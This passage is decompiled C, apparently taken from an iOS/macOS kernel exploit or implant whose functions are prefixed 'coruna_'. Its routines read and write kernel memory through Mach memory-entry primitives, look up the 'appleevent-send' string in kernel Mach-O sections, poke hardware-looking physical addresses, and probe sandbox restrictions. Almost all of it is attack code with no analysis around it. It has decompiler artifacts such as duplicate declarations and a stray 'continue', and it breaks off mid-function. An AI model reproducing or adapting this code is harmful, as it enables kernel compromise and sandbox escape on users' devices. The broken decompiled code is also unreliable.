        ptr = serial_buf;
      }
      else {
        ptr = host_info;
      }
      coruna_mach_port_deallocate_2b24c(val,ptr);
    }
    coruna_kernel5_residual_251(val,4);
  }
  if (*(long *)k_kernel_stack_chk_guard_slot != tmp_buf) {
    ___stack_chk_fail();
  }
  return;
}
void coruna_mach_absolute_time_18864(long handle,int flags)
{
  unsigned long u;
  int err;
  uint64_t size;
  long handle;
  
  if (flags == 0) {
    coruna_kernel5_residual_251(handle,4);
  }
  else {
    if (((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) &&
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x150), handle != 0)) {
      size = _mach_absolute_time();
      u = 0;
      if ((unsigned long)*(uint *)(handle + 0x260) != 0) {
        u = ((size - handle) * (unsigned long)*(uint *)(handle + 0x25c)) /
                (unsigned long)*(uint *)(handle + 0x260);
      }
      if (u < 20000000) {
        coruna_semaphore_timedwait(handle,(0x14 - (int)((u & 0xffffffff) / 1000000)) * 1000);
      }
    }
    err = coruna_mach_absolute_time_1a9c0(handle,4,1000);
    if (((err == 0) && (*(long *)(handle + 0x118) != 0)) && (*(long *)(handle + 0x120) != 0)) {
      size = _mach_absolute_time();
      *(uint64_t *)(*(long *)(handle + 0x118) + 0x150) = size;
    }
  }
  return;
}
void coruna_mach_absolute_time_18960(uint64_t val)
{
  unsigned long u;
  bool err;
  int err;
  uint64_t size;
  uint64_t version;
  uint64_t port;
  long handle;
  long addr;
  uint32_t tag;
  uint64_t kind;
  double ld11;
  double ld12;
  unsigned long type_id;
  long scratch [7];
  mach_timebase_info_t bootargs;
  
  bootargs.numer = 0;
  bootargs.denom = 0;
  _mach_timebase_info(&bootargs);
  type_id = (unsigned long)bootargs & 0xffffffff;
  u = (unsigned long)bootargs >> 0x20;
  size = _mach_absolute_time();
  err = coruna_fn_ptr_cast_10(val,0x1000000);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(val,0x100000);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(val,0x80000);
      if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        port = 0x23b080000;
        if ((err == 0) && (err = coruna_fn_ptr_cast_10(val,1), err == 0)) {
          return;
        }
        err = coruna_mach_make_memory_entry_2aed0(val,port,scratch);
        if (err != 0) {
        return;
        }
        tag = 0x1f0023ff;
        err = coruna_fn_ptr_cast_10(val,0x1000000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x100000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x80000);
        if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
        addr = 0x390;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,1);
        if (err == 0) {
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        err = err == 8;
        handle = 0x388;
        }
        else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
        addr = 0x3d0;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
        }
        addr = 0x3f8;
        }
        else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
        }
        err = coruna_fn_ptr_cast_10(val,0x2000000);
        err = err == 0;
        handle = 0x108;
        addr = 0x430;
        }
        if (!err) {
        addr = handle;
        }
        }
        else {
        addr = 0x408;
        }
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
      }
      kind = 0x28e580000;
      port = 0x200000;
    }
    else {
      kind = 0x404e80000;
      port = 0x2000000;
    }
    err = coruna_fn_ptr_cast_10(val,port);
    port = 0x23b700000;
    if (err != 0) {
      port = kind;
    }
  }
  else {
    port = 0x23b700000;
  }
fail:
  err = coruna_mach_make_memory_entry_2aed0(val,port,scratch);
  if (err != 0) {
    return;
  }
  tag = 0x1f0023ff;
  err = coruna_fn_ptr_cast_10(val,0x1000000);
  if (err == 0) {
    err = coruna_fn_ptr_cast_10(val,0x100000);
    if (err == 0) {
      err = coruna_fn_ptr_cast_10(val,0x80000);
      if (err == 0) {
        err = coruna_fn_ptr_cast_10(val,0x4000);
        tag = 0x1f0003ff;
        if (err != 0) {
          addr = 0x390;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_fn_ptr_cast_10(val,1);
        if (err == 0) {
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        err = err == 8;
        handle = 0x388;
      }
      else {
        err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
        if (err < 8) {
          addr = 0x3d0;
          if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
          ld11 = (double)NEON_ucvtf(u);
          ld12 = (double)NEON_ucvtf(type_id);
          ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
          *(uint32_t *)(addr + scratch[0]) = tag;
          do {
          version = _mach_absolute_time();
          if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
          } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
          coruna_semaphore_timedwait(val,1000);
          }
          coruna_mach_port_deallocate_2b24c(val,scratch);
          return;
        }
        err = coruna_fn_ptr_cast_10(val,0x200000);
        err = err == 0;
        handle = 0x3c0;
      }
      addr = 0x3f8;
    }
    else {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_20f14();
      if (err < 8) {
        addr = 0x3c8;
        if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
        ld11 = (double)NEON_ucvtf(u);
        ld12 = (double)NEON_ucvtf(type_id);
        ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
        *(uint32_t *)(addr + scratch[0]) = tag;
        do {
        version = _mach_absolute_time();
        if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
        } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
        coruna_semaphore_timedwait(val,1000);
        }
        coruna_mach_port_deallocate_2b24c(val,scratch);
        return;
      }
      err = coruna_fn_ptr_cast_10(val,0x2000000);
      err = err == 0;
      handle = 0x108;
      addr = 0x430;
    }
    if (!err) {
      addr = handle;
    }
  }
  else {
    addr = 0x408;
  }
done:
  if ((~*(uint *)(scratch[0] + addr) & 0xf) != 0) {
    ld11 = (double)NEON_ucvtf(u);
    ld12 = (double)NEON_ucvtf(type_id);
    ld11 = (ld11 / ld12) * k_kernel_rodata_word_42ef0 * k_kernel_rodata_word_434e8;
    *(uint32_t *)(addr + scratch[0]) = tag;
    do {
      version = _mach_absolute_time();
      if ((unsigned long)(long)(ld11 + (double)size) <= version) break;
    } while ((~*(uint *)(scratch[0] + addr) & 0xf) != 0);
    coruna_semaphore_timedwait(val,1000);
  }
  coruna_mach_port_deallocate_2b24c(val,scratch);
  return;
}
void coruna_kernel5_via_mach_port_deallocate_2b24c(uint64_t val,long handle,uint64_t *id_2)
{
  int err;
  
  id_2[5] = 0;
  id_2[4] = 0;
  id_2[7] = 0;
  id_2[6] = 0;
  id_2[1] = 0;
  *id_2 = 0;
  id_2[3] = 0;
  id_2[2] = 0;
  err = coruna_mach_make_memory_entry_2aed0(val,handle + 0x40000);
  if (err != 0) {
    coruna_mach_port_deallocate_2b24c(val,id_2);
  }
  return;
}
void coruna_call_mach_vm_machine_attribute_1d4f8_22818_stub(long handle,unsigned long arg)
{
  uint8_t scratch[40];
  
  coruna_call_mach_vm_machine_attribute_1d4f8_22818(handle,arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),scratch);
  return;
}
void coruna_mach_absolute_time_18cfc(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  version = *(unsigned long *)*id_2;
  if ((version & 0x90000000) == 0) {
    err = coruna_fn_ptr_cast_10(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version | 0x80000000;
    *(uint8_t *)(id_2 + 7) = 1;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_42ef0;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_434e8;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) goto fail;
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) == 0);
  }
  else {
fail:
    if (*(char *)(id_2 + 7) != '\0') {
      coruna_mach_absolute_time_2045c(val,id_2);
    }
  }
  return;
}
void coruna_mach_absolute_time_2045c(uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  uint64_t size;
  unsigned long version;
  double ld5;
  double ld6;
  mach_timebase_info_t scratch;
  
  if (*(char *)(id_2 + 7) != '\0') {
    version = *(unsigned long *)*id_2;
    err = coruna_fn_ptr_cast_10(val,0x1100000);
    if (err != 0) {
      coruna_semaphore_timedwait(val,1000);
    }
    *(unsigned long *)*id_2 = version & 0xffffffff2fffffff | 0x40000000;
    scratch.numer = 0;
    scratch.denom = 0;
    _mach_timebase_info(&scratch);
    ld5 = (double)NEON_ucvtf((unsigned long)scratch >> 0x20);
    ld6 = (double)NEON_ucvtf((unsigned long)scratch & 0xffffffff);
    ld5 = (ld5 / ld6) * k_kernel_rodata_word_42ef0;
    u = _mach_absolute_time();
    ld5 = ld5 * k_kernel_rodata_word_434e8;
    do {
      size = _mach_absolute_time();
      if ((unsigned long)(long)(ld5 + (double)u) <= size) {
        return;
      }
    } while (((uint)*(uint64_t *)*id_2 >> 0x1c & 1) != 0);
    *(uint8_t *)(id_2 + 7) = 0;
  }
  return;
}
void coruna_kernel509_via_syscall(uint64_t val,uint64_t id_2)
{
  void *ptr;
  int err;
  uint64_t scratch;
  uint64_t scratch;
  void *bootargs;
  unsigned long bootargs;
  uint thread_attr;
  void *host_info;
  
  host_info = (void *)0x0;
  thread_attr = 0;
  err = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_6(val,0,0,&host_info,&thread_attr,0);
  ptr = host_info;
  if (err != 0) {
    scratch = 0x786f62646e6153;
    bootargs = (unsigned long)thread_attr;
    bootargs = host_info;
    scratch = id_2;
    coruna_syscall(&scratch,1,&scratch);
    if (ptr != (void *)0x0) {
      _free(ptr);
    }
  }
  return;
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2667c_6(long handle,uint64_t *val,uint *size,uint64_t *id_2,uint *flags_2,
                 int flags)
{
  int err;
  long handle;
  void *ptr;
  uint u;
  void *buf;
  long addr;
  long off;
  long base;
  unsigned long size;
  long ctx_val;
  long scratch;
  uint bootargs;
  uint thread_attr;
  uint64_t host_info;
  
  bootargs = 0;
  err = *(int *)(handle + 0x140);
  if (err < 0x1f54) {
    if (err == 0x1809) {
      addr = 0;
      u = 0x10;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        u = 0x20;
      }
      base = 4;
      if (*(unsigned long *)(handle + 0x158) < 0x18091e01f00000) {
        base = 8;
      }
      ctx_val = 0x30;
    }
    else {
      if (err != 0x1c1b && err != 0x1f53) {
        return;
      }
      addr = 0x10;
      base = 4;
      ctx_val = 0x48;
      u = 0x10;
    }
  }
  else {
    if (err < 0x225c) {
      if (err != 0x1f54 && err != 0x2258) {
        return;
      }
    }
    else if (err != 0x225c) {
      if (err != 0x2712) {
        return;
      }
      u = 0x10;
      base = 4;
      ctx_val = 0x18;
      addr = 0x18;
      goto fail;
    }
    u = 0x10;
    base = 4;
    ctx_val = 0x18;
    addr = 0x10;
  }
fail:
  off = *(long *)(handle + 0x398);
  handle = coruna_fn_ptr_cast_2(handle,off);
  if (handle == 0) {
    return;
  }
  handle = off;
  if (0x1f5418ffffffff < *(unsigned long *)(handle + 0x158)) {
    err = coruna_kernel509_residual_307(handle,off + addr,&scratch);
    if (err == 0) {
      return;
    }
    addr = coruna_fn_ptr_cast_2(handle,scratch);
    handle = scratch;
    if (addr == 0) {
      return;
    }
  }
  err = coruna_kernel509_residual_307(handle,handle + ctx_val,&scratch);
  if (err == 0) {
    return;
  }
  if (scratch == 0) {
    ptr = (void *)0x0;
done:
    if ((val == (uint64_t *)0x0) && (size == (uint *)0x0)) {
      *id_2 = ptr;
      *flags_2 = bootargs;
      return;
    }
    if (flags == 0) {
      err = coruna_kernel509_residual_307(handle,off,&scratch);
      if (err != 0) goto cleanup;
check_ok:
      buf = (void *)0x0;
    }
    else {
      scratch = coruna_macho_cstring_24d58(handle);
      if (scratch == 0) goto check_ok;
cleanup:
      err = coruna_kernel509_residual_307(handle,scratch,&host_info);
      if (err == 0) goto check_ok;
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,scratch + *(int *)(handle + 0x168),4,&thread_attr);
      buf = (void *)0x0;
      if ((((err != 0) && (size = (unsigned long)thread_attr, thread_attr < 0x80001)) &&
          (buf = _malloc(size), buf != (void *)0x0)) &&
         (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,host_info,size,buf), err != 0)) {
        *id_2 = ptr;
        *flags_2 = bootargs;
        if (val == (uint64_t *)0x0) {
          return;
        }
        if (size == (uint *)0x0) {
          return;
        }
        *val = buf;
        *size = thread_attr;
        return;
      }
    }
    if (buf != (void *)0x0) {
    _free(buf);
    }
    return;
  }
  else {
    scratch = coruna_fn_ptr_cast_2(handle);
    if (scratch == 0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,(base - (unsigned long)u) + scratch,4,&bootargs);
    if (err == 0) {
      return;
    }
    bootargs = bootargs - u;
    size = (unsigned long)bootargs;
    if (0x3ff < bootargs - 1) {
      return;
    }
    ptr = _malloc(size);
    if (ptr == (void *)0x0) {
      return;
    }
    err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,scratch,size,ptr);
    if (err != 0) goto done;
    buf = (void *)0x0;
  }
  _free(ptr);
skip:
  if (buf != (void *)0x0) {
    _free(buf);
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_10_8(long handle,unsigned long arg)
{
  uint8_t *ptr;
  int err;
  unsigned long u;
  long handle;
  uint64_t scratch;
  uint bootargs;
  void *thread_attr;
  uint host_info;
  void *serial_buf;
  char action [8];
  uint5 scratch;
  uint32_t bootargs;
  void *block_ctx;
  unsigned long thread_attr;
  long stack_guard;
  
  ptr = k_kernel_mach_task_self_slot;
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  u = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(handle,*(uint32_t *)k_kernel_mach_task_self_slot);
  if (*(long *)k_kernel_stack_chk_guard_slot == stack_guard) {
  return;
  }
  ___stack_chk_fail(u);
}
void coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8_2b508_2(long handle,long addr_2,uint64_t val)
{
  long handle;
  int err;
  
  if (((handle != 0) && (addr_2 != 0)) &&
     (err = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_12(handle,*(uint32_t *)k_kernel_mach_task_self_slot), err != 0)) {
    if (*(long *)(handle + 0x3a8) == 0) {
      coruna_kernel509_via_helper_5d2c_419fc_2(val);
    }
    handle = *(long *)(&k_kernel_slot_18f0 + handle) +
            (unsigned long)(uint)((*(int *)(handle + 0x37c) + 1) * *(int *)(handle + 0x168));
    if (((*(int *)(&k_kernel_slot_1930 + handle) == -1) || (*(int *)(&k_kernel_slot_1934 + handle) == -1)) ||
       ((*(int *)(&k_kernel_slot_1940 + handle) == -1 ||
        ((*(long *)(handle + 0x218) == 0 || (*(char *)(handle + 0xc) != '\0')))))) {
      err = coruna_call_mach_vm_machine_attribute_1d4f8_2b508(handle,handle,0);
    }
    else {
      err = coruna_kernel509_via_mach_port_deallocate_2b24c(handle,handle,0);
    }
    if (err != 0) {
      coruna_kernel509_via_helper_5d2c_419fc_2(val);
    }
  }
  return;
}
void coruna_sandbox_check(int flags)
{
  uint8_t *ptr;
  pid_t lp2;
  int err;
  
  lp2 = _getpid();
  err = _sandbox_check(lp2,0,0);
  if (err != 0) {
    lp2 = _getpid();
    ptr = k_kernel_sandbox_check_no_report_slot;
    err = _sandbox_check(lp2,"mach-lookup",*(uint *)k_kernel_sandbox_check_no_report_slot | 2);
    if (err == 0) {
      lp2 = _getpid();
      err = _sandbox_check(lp2,"mach-lookup",*(uint *)ptr | 2);
      if (err != 0 && flags != 0) {
        lp2 = _getpid();
        err = _sandbox_check(lp2,"syscall-unix",*(uint32_t *)ptr);
        if ((err != 1) && (err = _socket(2,2,0), err != -1)) {
          _close(err);
        }
      }
    }
  }
  return;
}
void coruna_sandbox_check_19840(long handle)
{
  pid_t lp1;
  int err;
  
  lp1 = _getpid();
  err = _sandbox_check(lp1,0,0);
  if ((err == 0) || (err == 1)) {
    *(char *)(handle + 10) = (char)err;
  }
  return;
}
void coruna_macho_cstring_24d58(long handle)
{
  uint8_t *ptr;
  int err;
  long handle;
  long addr;
  unsigned long u;
  uint8_t scratch[24];
  uint8_t bootargs[24];
  
  if (*(long *)(handle + 0x5c0) != 0) {
    return;
  }
  if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
     (handle = *(long *)(*(long *)(handle + 0x118) + 0x130), handle == 0)) {
    err = coruna_fn_ptr_cast_10(handle,0x1000);
    ptr = &k_kernel_slot_1d18;
    if (err != 0) {
      ptr = &k_kernel_slot_19f8;
    }
    handle = *(long *)(ptr + handle);
    if (handle == 0) {
      return;
    }
    coruna_macho_map_segsect(bootargs,handle,"__TEXT","__cstring");
    addr = coruna_kernel509_via_kernel509_via_cat(bootargs,"appleevent-send",0,1);
    if (addr == 0) {
      return;
    }
    coruna_macho_map_segsect(scratch,handle,"__DATA_CONST","__const");
    addr = coruna_kernel509_via_call_mach_vm_machine_attribute_1d4f8(scratch,addr,*(uint8_t *)(handle + 0x34),1);
    if (addr == 0) {
      return;
    }
    if (*(int *)(handle + 0x140) < 0x1c1b) {
      if (*(int *)(handle + 0x140) < 0x1809) {
        u = coruna_fn_ptr_cast_3(handle);
        addr = coruna_helper_127b4_1b298_stub(handle,addr + (u & 0xffffffff) * -2);
      }
      else {
        addr = addr + -0x80;
      }
    }
    else {
      addr = addr + -0xb8;
    }
    handle = coruna_fn_ptr_cast_2(handle,addr);
    if (handle == 0) {
      return;
    }
    if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
      *(long *)(*(long *)(handle + 0x118) + 0x130) = handle;
    }
  }
  *(long *)(handle + 0x5c0) = handle;
  return;
}
void coruna_kernel509_residual_303(long handle,short *arg,uint64_t val)
{
  int err;
  long handle;
  uint u;
  long addr;
  int status;
  void *ptr;
  uint size;
  long off;
  unsigned long version;
  uint port;
  uint scratch;
  
  if (((*(int *)(handle + 0x140) == 0x1c1b || *(int *)(handle + 0x140) == 0x1809) &&
      (size = (uint)val, 0xb < size)) && (-1 < *arg)) {
    off = (unsigned long)*(byte *)((long)arg + 5) * 2;
    addr = (unsigned long)*(byte *)(arg + 5) + (unsigned long)(ushort)arg[4] +
            (unsigned long)*(byte *)((long)arg + 0xb);
    handle = off + addr * 2 + 0xc;
    port = (uint)handle;
    if (port <= size) {
      u = port + (uint)*(byte *)(arg + 2) * 2;
      err = 0;
      if ((u & 6) != 0) {
        err = 8 - (u & 6);
      }
      u = err + u;
      scratch = u;
      ptr = _calloc((unsigned long)(size << 3),1);
      if (ptr != (void *)0x0) {
        if (port < u) {
          version = 0;
          err = (int)addr * 2 + (int)off + 0xc;
          while (size = (uint)*(ushort *)((long)arg + version + handle), size != 0) {
            size = u + size * 8;
            if (((size < (uint)(err + (int)version)) ||
                (status = coruna_kernel509_residual_304(arg,val,ptr,u,size,&scratch), status != 0)) ||
               (size = (int)version + 2, version = (unsigned long)size, scratch <= err + size)) break;
          }
        }
        _free(ptr);
      }
    }
  }
  return;
}
void coruna_kernel509_residual_304(long handle,uint64_t val,long addr_2,uint64_t id_2,uint size,
                 uint *flags_2)
{
  char *ptr;
  int err;
  
  if ((size + 8 <= (uint)val) && (*(char *)(addr_2 + (unsigned long)(size >> 3)) == '\0')) {
    *(uint8_t *)(addr_2 + (unsigned long)(size >> 3)) = 1;
    if (size < *flags_2) {
      *flags_2 = size;
    }
    ptr = (char *)(handle + (unsigned long)size);
    if (*ptr == '\x01') {
      if ((*(ushort *)(ptr + 1) & 1) != 0) {
        *(ushort *)(ptr + 1) = *(ushort *)(ptr + 1) & 0xfffa;
      }
    }
    else {
      err = coruna_kernel509_residual_304(handle,val,addr_2,id_2,
                           (int)id_2 + (uint)*(ushort *)(ptr + 4) * 8,flags_2);
      if (err == 0) {
        coruna_kernel509_residual_304(handle,val,addr_2,id_2,
                     (int)id_2 + (uint)*(ushort *)(ptr + 6) * 8,flags_2);
      }
    }
  }
  return;
}
void coruna_kernel509_residual_305(uint64_t val,char *path,uint64_t *id_2)
{
  int err;
  size_t ls2;
  uint64_t scratch;
  
  ls2 = _strlen(path);
  err = coruna_kernel509_via_fn_ptr_cast_2_3(val,path,ls2 + 1,&scratch);
  if (err != 0) {
    *id_2 = scratch;
  }
  return;
}
void coruna_kernel509_via_fn_ptr_cast_2_3(long handle,char *path,size_t len,long *addr_2)
{
  uint u;
  int err;
  long handle;
  long addr;
  uint64_t size;
  char *ptr;
  void *ptr;
  unsigned long version;
  unsigned long port;
  uint64_t *ptr;
  uint scratch;
  long bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t action;
  uint64_t thread_attr;
  uint64_t block_ctx;
  uint7 host_info;
  uint8_t serial_buf;
  long stack_guard;
  
  stack_guard = *(long *)k_kernel_stack_chk_guard_slot;
  if ((*(long *)(&k_kernel_slot_1a00 + handle) != 0) &&
     (handle = coruna_kernel5_residual_227(*(long *)(&k_kernel_slot_1a00 + handle),path,len), handle != 0)) {
    *addr_2 = handle;
fail:
    size = 1;
    if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
    }
    return;
  }
  ptr = *(void **)(&k_kernel_slot_1d10 + handle);
  if (ptr == (void *)0x0) {
    if (((*(long *)(handle + 0x118) == 0) || (*(long *)(handle + 0x120) == 0)) ||
       (handle = *(long *)(*(long *)(handle + 0x118) + 0x108), handle == 0)) {
      handle = coruna_find_mod_init(*(uint64_t *)(&k_kernel_slot_19f8 + handle));
      if ((handle != 0) && (addr = coruna_fn_ptr_cast_2(handle,handle), addr != 0)) {
        if ((*(long *)(handle + 0x118) != 0) && (*(long *)(handle + 0x120) != 0)) {
          *(long *)(*(long *)(handle + 0x118) + 0x108) = handle;
        }
        goto cleanup;
      }
    }
    else {
cleanup:
      err = coruna_kernel509_via_mach_vm_read_overwrite(handle,handle + 0x14,&scratch);
      if (((err != 0) && (scratch < 0x401)) &&
         ((err = coruna_kernel509_residual_307(handle,handle + 0x20,&bootargs), err != 0 &&
          (handle = coruna_fn_ptr_cast_2(handle,bootargs), u = scratch, handle != 0)))) {
        version = (unsigned long)scratch;
        ptr = _calloc(version * 0x48,1);
        if (ptr != (void *)0x0) {
          if (u == 0) {
            scratch = 0;
          }
          else {
            port = 0;
            ptr = (uint64_t *)((long)ptr + 8);
            do {
              err = coruna_kernel509_residual_307(handle,bootargs +
                                           (unsigned long)(uint)(*(int *)(handle + 0x168) * (int)port),
                                   &thread_attr);
              if ((((err == 0) || (handle = coruna_fn_ptr_cast_2(handle,thread_attr), handle == 0)) ||
                  (err = coruna_kernel509_residual_307(handle,thread_attr + 0x50,&thread_attr), err == 0)) ||
                 (err = coruna_call_mach_vm_machine_attribute_1d4f8_2667c(handle,thread_attr + 0x10,0x40,&host_info), err == 0)) {
check_ok:
                _free(ptr);
                size = 0;
              }
              serial_buf = 0;
              ptr[1] = scratch;
              *ptr = host_info;
              ptr[3] = bootargs;
              ptr[2] = serial_buf;
              ptr[5] = thread_attr;
              ptr[4] = action;
              ptr[7] = (unsigned long)host_info;
              ptr[6] = block_ctx;
              err = coruna_kernel509_residual_307(handle,thread_attr + 0x9c,&thread_attr);
              if (err == 0) goto check_ok;
              ptr[-1] = thread_attr;
              port = port + 1;
              ptr = ptr + 9;
            } while (version != port);
          }
          *(void **)(&k_kernel_slot_1d10 + handle) = ptr;
          *(uint *)(&k_kernel_slot_1d08 + handle) = scratch;
          continue;
        }
      }
    }
  }
  else {
    scratch = *(uint *)(&k_kernel_slot_1d08 + handle);
next:
    if (0x3f < len) {
      len = 0x40;
    }
    if (scratch != 0) {
      version = (unsigned long)scratch;
      ptr = (char *)((long)ptr + 8);
      do {
        err = _strncmp(path,ptr,len);
        if (err == 0) {
          *addr_2 = *(long *)(ptr + -8);
          size = 1;
          if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
          ___stack_chk_fail(size);
          }
          return;
        }
        ptr = ptr + 0x48;
        version = version - 1;
      } while (version != 0);
    }
  }
skip:
  size = 0;
done:
  if (*(long *)k_kernel_stack_chk_guard_slot != stack_guard) {
    ___stack_chk_fail(size);
  }
  return;
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_3(void)
{
  int err;
  uint64_t *in_x3;
  uint64_t scratch;
  
  err = coruna_kernel509_via_fn_ptr_cast_2_3();
  if (err != 0) {
    *in_x3 = scratch;
  }
  return;
}
void coruna_kernel5_residual_246(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return;
  }
  return;
}
void coruna_kernel5_residual_247(uint64_t *val)
{
  if (val != (uint64_t *)0x0) {
    if ((void *)*val != (void *)0x0) {
      _free((void *)*val);
    }
    *val = 0;
    val[1] = 0;
    *(uint32_t *)(val + 2) = 0;
    return;
  }
  return;
}
void coruna_kernel509_via_kernel5_residual_249(long *handle,uint32_t size)
{
  uint u;
  int err;
  long handle;
  
  err = coruna_kernel5_residual_249((int)handle,0xc);
  if (err == 0) {
    handle = *handle;
    u = *(uint *)(handle + 1);
    *(uint32_t *)((unsigned long)u + handle) = size;
    *(uint64_t *)((uint32_t *)((unsigned long)u + handle) + 1) = k_kernel_rodata_word_434f8;
    *(int *)(handle + 1) = (int)handle[1] + 0xc;
    *(int *)(handle + 2) = (int)handle[2] + 1;
  }
  return;
}
void coruna_kernel5_residual_249(long *handle,uint size)
{
  void *ptr;
  
  if (((uint)(*(int *)((long)handle + 0xc) - (int)handle[1]) < size) && (size < 0xfffffc00))
  {
    if (*(int *)((long)handle + 0xc) == 0) {
      size = size + 0x41c;
